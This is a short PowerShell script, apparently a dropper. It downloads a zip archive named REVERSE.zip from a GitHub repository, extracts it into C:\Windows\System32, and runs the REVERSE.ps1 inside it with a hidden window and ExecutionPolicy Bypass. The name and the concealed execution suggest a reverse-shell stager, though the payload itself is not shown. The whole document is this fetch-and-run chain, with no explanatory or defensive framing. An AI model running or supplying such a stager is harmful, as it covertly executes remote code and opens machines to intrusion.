$client = new-object System.Net.WebClient
start-sleep 3
$client.DownloadFile("https://github.com/Gaaskenz/TESTE/archive/refs/heads/main.zip" , "REVERSE.zip")
start-sleep 2
Expand-Archive -LiteralPath 'C:\Windows\System32\REVERSE.zip' -DestinationPath C:\Windows\System32
start-sleep 5
powershell -windowstyle hidden -ExecutionPolicy Bypass -File "C:\Windows\System32\Teste-main\REVERSE.ps1"